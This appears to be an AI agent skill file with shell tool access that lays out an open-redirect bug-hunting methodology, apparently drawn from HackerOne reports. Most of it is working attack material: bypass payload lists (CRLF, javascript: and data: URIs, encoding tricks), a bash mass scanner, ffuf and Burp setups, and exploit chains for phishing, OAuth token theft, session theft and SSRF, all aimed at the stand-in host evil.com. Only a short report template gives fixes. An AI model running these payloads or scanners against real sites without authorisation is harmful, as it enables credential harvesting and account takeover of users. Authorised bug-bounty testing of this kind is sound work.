---
name: openredirect-deep-dive
description: Complete Open Redirect methodology from 272 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - open redirect methodology
  - open redirect deep dive
  - open redirect complete
  - open redirect all techniques
  - skills openredirect
---

# Complete Open Redirect Methodology - From 272 HackerOne Reports

## Top 20 Real Open Redirect Reports

| Upvotes | Company | Summary | Payout |
|---------|---------|---------|--------|
| 356 | CS Money | ATO via open redirect on transfer page | N/A |
| 247 | X/MoPub | XSS + Open Redirect chained | $1,540 |
| 225 | Showmax | Open redirect in logout functionality | $550 |
| 177 | Upserve | Open redirect in SSO callback | $1,200 |
| 168 | Expedia | Open redirect on logout page | $1,000 |
| 146 | Brave | QR code scanning open redirect | N/A |
| 141 | Uber | Central ATO via open redirect chain | N/A |
| 139 | XVIDEOS | Open redirect in redirect parameter | N/A |
| 96 | TikTok | CRLF injection leads to open redirect | N/A |
| 91 | HackerOne | Open redirect in OAuth flow | N/A |
| 84 | Uber | Open redirect on auth callback | N/A |
| 80 | Mail.ru | Open redirect in email verification | N/A |
| 79 | Shopify | Open redirect on store logout | N/A |
| 72 | Twitter/X | Open redirect via t.co shortener | N/A |
| 67 | Semrush | Open redirect in campaign URL | N/A |
| 63 | Starbucks | Open redirect on gift card page | N/A |
| 60 | Valve/Steam | Open redirect in steamcommunity | N/A |
| 57 | Snapchat | Open redirect via bit.ly integration | N/A |
| 54 | Reddit | Open redirect in OAuth redirect_uri | N/A |
| 50 | Nextcloud | Open redirect in sharing feature | N/A |

## Step 1: Parameter Recon for Open Redirects

### Common Redirect Parameters
```bash
# Find redirect parameters from recon data
grep -E '(\?|&)(redirect|return|next|url|goto|to|link|target|dest|destination|continue|returnto|return_to|redirect_uri|redirect_url|logout|view|forward|forward_url|image_url|img|src|ref|referer|referrer|endpoint|path|location|uri|callback|cb|page|original|done|final|finish|follow|out|load|preview|source|domain|host|validate|confirm|token|code|state|response_type|scope|client_id)[=:]' recon/{target}/urls.txt | sort -u

# Use ParamSpider to extract parameters
python3 paramspider.py --domain {target} --exclude woff,css,png,svg,jpg

# Use WaybackURLs
waybackurls {target} | grep -E '=https?://' | sort -u
```

### Features to Check for Redirects

| Feature | Description |
|---------|-------------|
| Login/OAuth callbacks | redirect_uri, state, response_type |
| Logout endpoints | /logout?redirect=, /signout?url= |
| SSO/SAML flows | RelayState, ACS URL, AssertionConsumer |
| Error pages | /error?return=, /404?page= |
| Payment flows | /checkout?return=, /pay?callback= |
| Email verification | /verify?next=, /confirm?redirect= |
| Password reset | /reset?redirect_uri=, /forgot?return= |
| Social share links | /share?url=, /post?redirect= |
| QR code generation | /qr?data=, /qrcode?url= |
| File download | /download?file=, /dl?redirect= |
| Short URLs | /s/, /go/, /l/, /r/ |
| API redirects | /api/auth?redirect=, /api/v1/oauth |
| Image proxy | /image?url=, /img?src= |
| Affiliate links | /ref=, /referral= |

## Step 2: Basic Open Redirect Testing

### Test 1: External URL Redirect
```bash
# Direct external URL
curl -sk "https://{target}/logout?redirect=https://evil.com"
curl -sk "https://{target}/login?return=https://evil.com"

# Follow redirects with -L
curl -skL "https://{target}/logout?redirect=https://evil.com"
```

### Test 2: Check Response Headers
```bash
curl -skI "https://{target}/logout?redirect=https://evil.com"
# Look for: Location: https://evil.com, Refresh: 0;url=...
```

### Test 3: JavaScript Window.location
```bash
curl -sk "https://{target}/redirect?url=https://evil.com"
# Check response body for:
# window.location = "..."
# window.location.href = "..."
# window.open("...")
# document.location = "..."
```

### Test 4: Meta Refresh
```bash
# Check for:
# <meta http-equiv="refresh" content="0;url=...">
# <meta http-equiv="refresh" content="0;URL=...">
```

## Step 3: 11 Open Redirect Bypass Techniques

### Technique 1: @ Symbol (URL Credential Confusion)
```bash
# The @ symbol makes browsers ignore everything before it
https://{target}/logout?redirect=https://evil.com@legitimate.com
https://{target}/logout?redirect=https://legitimate.com@evil.com
https://{target}/logout?redirect=http://evil.com:password@legitimate.com
https://{target}/logout?redirect=http://legitimate.com%40evil.com
```

### Technique 2: Protocol Confusion (//)
```bash
# URL starts with // - inherits current protocol
https://{target}/logout?redirect=//evil.com
https://{target}/logout?redirect=\/\/evil.com
https://{target}/logout?redirect=\/\/evil.com/
```

### Technique 3: CRLF Injection
```bash
# Inject newlines to break out of URL validation
https://{target}/logout?redirect=https://legitimate.com%0d%0aLocation:%20https://evil.com
https://{target}/logout?redirect=https://legitimate.com%0aLocation:%20https://evil.com
https://{target}/logout?redirect=javascript:alert(1)%0d%0a
```

### Technique 4: URL Encoding
```bash
# Encode characters to bypass regex validation
https://{target}/logout?redirect=https:%2f%2fevil.com
https://{target}/logout?redirect=https%3a%2f%2fevil.com
https://{target}/logout?redirect=https%3A//evil.com
https://{target}/logout?redirect=https://evil%2ecom
https://{target}/logout?redirect=%68%74%74%70%73://evil.com
```

### Technique 5: Double URL Encoding
```bash
# Double encode to bypass WAFs
https://{target}/logout?redirect=https%253a%252f%252fevil.com
https://{target}/logout?redirect=%252f%252fevil.com
```

### Technique 6: Unicode/Homograph Attacks
```bash
# Homograph characters that look like ASCII
https://{target}/logout?redirect=https://еvil.com  # Cyrillic 'е'
https://{target}/logout?redirect=https://evil.com  # Fullwidth characters
https://{target}/logout?redirect=https://xn--evil-...com  # Punycode bypass
```

### Technique 7: Data URI Scheme
```bash
# Data URIs for JavaScript execution
https://{target}/logout?redirect=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
https://{target}/logout?redirect=data:text/html,<script>alert(1)</script>
```

### Technique 8: Newline Injection
```bash
# Newlines can break URL validation
https://{target}/logout?redirect=https://legitimate.com\nhttps://evil.com
https://{target}/logout?redirect=https://evil.com%23%0d%0a
```

### Technique 9: JavaScript Protocol
```bash
# javascript: URIs for XSS
https://{target}/logout?redirect=javascript:alert(document.cookie)
https://{target}/logout?redirect=javascript://%0aalert(1)
https://{target}/logout?redirect=JaVaScRiPt:alert(1)
```

### Technique 10: Tab Injection
```bash
# Tab characters (%09) can bypass domain validation
https://{target}/logout?redirect=https://evil.com%09/
https://{target}/logout?redirect=https://evil.com%09.legitimate.com
https://{target}/logout?redirect=https://legitimate.com%09@evil.com
```

### Technique 11: Path Truncation
```bash
# Use path components to confuse parsers
https://{target}/logout?redirect=https://legitimate.com.evil.com  # Subdomain trick
https://{target}/logout?redirect=https://evil.com/..legitimate.com  # Backtracking
https://{target}/logout?redirect=https://legitimate.com%23evil.com  # Fragment bypass
https://{target}/logout?redirect=https://legitimate.com%3Fevil.com  # Query bypass
https://{target}/logout?redirect=https://legitimate.com\n@evil.com  # Newline + @
https://{target}/logout?redirect=//legitimate.com@evil.com  # Double slash + @
```

## Step 4: Domain Whitelist Bypasses

```bash
# Subdomain takeover
https://{target}/logout?redirect=https://evil.legitimate.com  # If subdomain is dangling

# Domain prefix confusion
https://{target}/logout?redirect=https://evil.com/legitimate.com
https://{target}/logout?redirect=https://legitimate.com.evil.com

# Path confusion
https://{target}/logout?redirect=https://legitimate.com/evil.com
https://{target}/logout?redirect=https://legitimate.com.evil.com/legitimate.com

# TLD confusion (if checking contains)
https://{target}/logout?redirect=https://evilcom  # Missing dot
https://{target}/logout?redirect=https://legitimate.com@evil.com

# Case sensitivity bypass
https://{target}/logout?redirect=https://LEGITIMATE.COM.EVIL.COM

# Null byte injection
https://{target}/logout?redirect=https://legitimate.com%00@evil.com
https://{target}/logout?redirect=https://evil.com%00.legitimate.com

# Bracket notation
https://{target}/logout?redirect=https://[::1]:8080/  # IPv6 bypass
https://{target}/logout?redirect=https://127.0.0.1:8080/  # Internal redirect
```

## Step 5: Open Redirect Exploit Chains

### Chain 1: Open Redirect → Phishing → Credential Harvesting
```bash
# Step 1: Find redirect parameter
# Step 2: Create phishing URL
https://{target}/logout?redirect=https://evil.com/fake-login
# Step 3: Victim clicks, enters credentials on fake page
# Step 4: Capture credentials, redirect back to real site
```

### Chain 2: Open Redirect → Session Token Theft
```bash
# Step 1: Create URL with redirect to attacker-controlled page
# Step 2: Victim's Referer header leaks session tokens
# Step 3: Use stolen cookies/tokens
```

### Chain 3: Open Redirect → OAuth Token Theft
```bash
# Step 1: Find OAuth redirect_uri parameter
https://{target}/oauth/callback?redirect_uri=https://evil.com
# Step 2: Victim authorizes app
# Step 3: Authorization code sent to evil.com
# Step 4: Exchange code for access token
```

### Chain 4: Open Redirect → CRLF → XSS → ATO
```bash
# Step 1: Find redirect parameter vulnerable to CRLF
https://{target}/redirect?url=https://legitimate.com%0d%0aSet-Cookie:%20session=evil
# Step 2: Use CRLF to inject headers or script
# Step 3: Victim executes malicious JS
# Step 4: Steal cookies / perform ATO
```

### Chain 5: Open Redirect → SSRF Bypass
```bash
# Step 1: Find internal service that only accepts certain domains
# Step 2: Use open redirect on external domain to reach it
https://{target}/ssrf-endpoint?url=https://external.com/redirect?url=http://127.0.0.1:8080/admin
# Step 3: External-domain allows redirect, SSRF executes
```

### Chain 6: Open Redirect → OAuth Account Linking
```bash
# Step 1: Abused OAuth redirect_uri in account linking flow
# Step 2: Victim's account gets linked to attacker's OAuth provider
# Step 3: Attacker logs in as victim via linked account
```

### Chain 7: Open Redirect → OpenID Connect → Full Account Takeover
```bash
# Step 1: Manipulate redirect_uri in OIDC flow
# Step 2: Steal authorization code
# Step 3: Exchange for ID token
# Step 4: Full account takeover
```

## Step 6: Detection & Recon Automation

```bash
#!/bin/bash
# Open Redirect Scanner - Mass parameter testing
TARGET=$1
PARAMS="redirect return next url goto to link target dest destination continue returnto return_to redirect_uri logout view forward forward_url image_url src ref referer endpoint path location uri callback page original done final follow out load preview source"

for param in $PARAMS; do
  # Test basic external redirect
  code=$(curl -skL -o /dev/null -w "%{http_code}" "https://$TARGET/page?$param=https://evil.com/" 2>/dev/null)
  if [ "$code" != "000" ]; then
    loc=$(curl -skI "https://$TARGET/page?$param=https://evil.com/" 2>/dev/null | grep -i "^location:" | head -1)
    if echo "$loc" | grep -qi "evil.com"; then
      echo "OPEN REDIRECT: $param -> Location: $loc"
    fi
  fi

  # Test // protocol-relative
  code2=$(curl -skL -o /dev/null -w "%{http_code}" "https://$TARGET/page?$param=//evil.com" 2>/dev/null)
  if [ "$code2" != "000" ]; then
    loc2=$(curl -skI "https://$TARGET/page?$param=//evil.com" 2>/dev/null | grep -i "^location:" | head -1)
    if echo "$loc2" | grep -qi "evil.com"; then
      echo "OPEN REDIRECT (//): $param -> $loc2"
    fi
  fi

  # Test @ symbol
  code3=$(curl -skL -o /dev/null -w "%{http_code}" "https://$TARGET/page?$param=https://evil.com@legitimate.com" 2>/dev/null)
  if [ "$code3" != "000" ]; then
    loc3=$(curl -skI "https://$TARGET/page?$param=https://evil.com@legitimate.com" 2>/dev/null | grep -i "^location:" | head -1)
    if echo "$loc3" | grep -qi "evil.com"; then
      echo "OPEN REDIRECT (@): $param -> $loc3"
    fi
  fi

  # Test CRLF
  code4=$(curl -skL -o /dev/null -w "%{http_code}" "https://$TARGET/page?$param=https://legitimate.com%0d%0aLocation:%20https://evil.com" 2>/dev/null)
  if [ "$code4" != "000" ]; then
    loc4=$(curl -skI "https://$TARGET/page?$param=https://legitimate.com%0d%0aLocation:%20https://evil.com" 2>/dev/null | grep -i "evil.com")
    if echo "$loc4" | grep -qi "evil.com"; then
      echo "OPEN REDIRECT (CRLF): $param -> $loc4"
    fi
  fi
done

# JavaScript-based redirects
curl -sk "https://$TARGET/page?url=https://evil.com" 2>/dev/null | grep -Eq '(window\.location|document\.location|window\.open)' && echo "JS REDIRECT: window.location manipulation detected"
```

### Burp Suite Intruder Setup
```
Positions: /endpoint?REDIRECT_PARAM=§https://evil.com§
Payloads: All bypass techniques from Step 3
Grep Match: Location: https?://evil
```

### OpenRedirectify (Python-based scanner)
```bash
# Install and run
git clone https://github.com/anshumanbh/openredirectify
cd openredirectify
python openredirectify.py -l urls.txt -p payloads.txt
```

## Step 7: Validate Severity & Report

### Impact Assessment
| Scenario | Severity |
|----------|----------|
| Basic redirect (no chain) | Low - Medium |
| Redirect with sensitive params in URL | Medium - High |
| Redirect chainable to OAuth token theft | High - Critical |
| Redirect chainable to SSRF bypass | High |
| Redirect with CRLF → XSS | High - Critical |
| Redirect in login flow (phishing) | Medium |

### Payout Range: $250 - $3,000

### Report Template
```markdown
**Summary:**
Open redirect vulnerability in [parameter] at [endpoint] allows attackers to
redirect users to arbitrary external domains.

**Impact:**
An attacker can exploit this open redirect for:
- Phishing attacks (credential harvesting)
- Malware distribution
- OAuth token/authorization code theft
- Bypassing SSRF protections
- Reputation damage (trusted domain redirects to malicious site)

**Steps to Reproduce:**
1. Visit: https://{target}/endpoint?redirect=https://evil.com
2. Browser redirects to evil.com

**Proof of Concept:**
Request:
GET /endpoint?redirect=https://evil.com HTTP/1.1
Host: {target}

Response:
HTTP/1.1 302 Found
Location: https://evil.com

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (5.4 Medium)
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (8.1 High) [when chained]

**Suggested Fix:**
1. Never use user input directly in redirect headers
2. Maintain an allowlist of permitted redirect domains
3. Validate the entire URL, not just the domain
4. Use relative paths only (/redirect/page instead of ?url=...)
5. For external URLs, display an interstitial warning page
6. Encode/validate all URL parameters properly
7. Strip dangerous characters (CR, LF, @, //)
```

## Advanced Open Redirect Vectors

### 1. Blind Open Redirect via DOM/JS
Client-side redirects via `window.location` assignment from URL params, `location.href = userInput`, `window.open(userInput)`. No server-side redirect, pure client-side but still valid for phishing/chains. How to find in JS bundles: grep for `location.href\s*=|location.assign\(|window.open\(` in JavaScript source maps or minified bundles.

### 2. Open Redirect via Service Worker
Service Worker fetch handler redirects to arbitrary URLs. If SW scope includes the redirect endpoint, the SW can intercept and redirect to evil.com. Testing: use Chrome DevTools → Application → Service Workers pane, inspect `fetch` event handlers for `respondWith` with redirect logic. Payload: register SW that does `event.respondWith(Response.redirect('https://evil.com'))`.

### 3. Open Redirect via `<meta>` Refresh
`<meta http-equiv="refresh" content="0;url=http://evil.com">` injected via HTML injection or JSONP callback. Browser follows automatically. Test: look for user-controlled values in `<meta>` refresh tags. Bypass: use `0;url=` format, URL encoding inside the meta tag.

### 4. Open Redirect via iframe `src`
iframe src=`/external?url=http://evil.com` — if the page renders an iframe with attacker-controlled src, it behaves like open redirect for phishing. The victim sees the trusted domain in the URL bar while the iframe loads the malicious site. Check endpoints that take `url`, `src`, `embed`, `frame-src` params.

### 5. GraphQL Open Redirect
If GraphQL endpoint accepts a redirect URL in query variables, or the GraphQL playground redirects after mutation, test all string fields for URL injection. Example mutation:
```graphql
mutation { login(input: {redirectUrl: "https://evil.com"}) { url } }
```
Check the GraphQL schema for fields named `redirect`, `url`, `callback`, `returnUrl`. Introspect the schema to find hidden redirect parameters.

### 6. Chained Open Redirect Vectors
- **OAuth redirect_uri** — state parameter injection
- **SAML RelayState** — arbitrary URL injection in SAML response
- **JWT issuer URL** — issuer in redirect endpoint
- **Logout page next param** — `/logout?next=`
- **SSO callback** — `acsURL`, `AssertionConsumerServiceURL`
- **QR code scanning redirect** — QR data URL redirect
- **Deep link intent redirect** — mobile apps with `intent://` scheme
- **OpenID Connect** — `redirect_uri` in OIDC discovery

### 7. Methodology for Finding Open Redirect Faster
```bash
# Grep katana/gau output for redirect patterns
grep -Eia '(redirect|return|logout|next|callback|dest|continue|url=)' urls.txt | sort -u

# Filter to only URLs with =http
grep -Eia '(redirect|return|url)=https?://' urls.txt | sort -u

# Fuzz with ffuf using open redirect payload list
ffuf -u "https://{target}/FUZZ?redirect=https://evil.com" -w redirect-endpoints.txt -mr "evil.com"

# Common endpoint wordlist
echo -e "/logout\n/login\n/signout\n/oauth\n/connect\n/auth\n/callback\n/redirect\n/go\n/link\n/r" > redirect-endpoints.txt
```

### 8. Open Redirect Payout Table by Chain
| Chain Type | Payout Range (USD) |
|------------|-------------------|
| Standalone redirect | $250 - $1,000 |
| OAuth chain (token theft) | $2,000 - $10,000 |
| SSRF bypass | $1,000 - $4,000 |
| Phishing chain (credential harvest) | $500 - $3,000 |
| ATO chain (full takeover) | $2,000 - $35,000 |
| CRLF → XSS chain | $1,000 - $5,000 |
| SAML/SSO compromise | $3,000 - $15,000 |

## Quick Reference: Top Open Redirect Reports by Technique

| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| CS Money | ATO chain | OAuth redirect_uri abuse | N/A |
| X/MoPub | XSS chain | CRLF + Open Redirect | $1,540 |
| Showmax | Logout | Exteral URL in logout | $550 |
| Upserve | SSO | RelayState manipulation | $1,200 |
| Expedia | Logout | Open redirect in signout | $1,000 |
| Brave | QR code | QR data redirect | N/A |
| Uber | OAuth | redirect_uri ATO chain | N/A |
| XVIDEOS | Direct | Basic redirect param | N/A |
| TikTok | CRLF | CRLF to redirect injection | N/A |
| HackerOne | OAuth | redirect_uri bypass | N/A |
